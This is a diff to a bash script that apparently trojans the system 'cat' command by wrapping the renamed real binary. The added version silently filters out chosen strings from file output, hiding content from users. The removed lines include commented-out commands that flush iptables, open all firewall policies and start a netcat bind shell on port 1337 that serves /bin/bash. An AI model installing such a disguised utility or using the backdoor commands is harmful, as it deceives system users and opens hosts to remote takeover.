@@ -1,34 +1,6 @@
 #!/bin/bash
 
 # Execute real 'cat' command and don't display anything. Also mess with them
-/lib/module_cat $@ | grep -Ev "*" | echo "No cats allowed"
+/lib/module_cat $@ | grep -Ev "HIDE STRING HERE"
 
-# Every good script needs some psychological warfare
-echo ""
-echo "Gonna have to use something like vim if you want to read this file ;P"
-
-# Sleep a bit before any error messages and the train
-sleep 4
-
-# Source the ~/.bashrc
-source ~/.bashrc
-
-# Flush iptables rules
-#sudo iptables -F
-#sudo iptables -t mangle -F
-#sudo iptables -t nat -F
-#sudo iptables -t filter -F
-#sudo iptables -t raw -F
-#sudo iptables -t security -F
-
-# Change default policies for 'iptables'
-#sudo iptables -P INPUT ACCEPT 
-#sudo iptables -P OUTPUT ACCEPT
-#sudo iptables -P FORWARD ACCEPT
-
-# Open up a netcat listener on the best port (TCP)
-#sudo nc -lp 1337 -e /bin/bash &
-
-# Have some fun :D
-#sudo apt install sl > /dev/null
-sl
+/bin/al
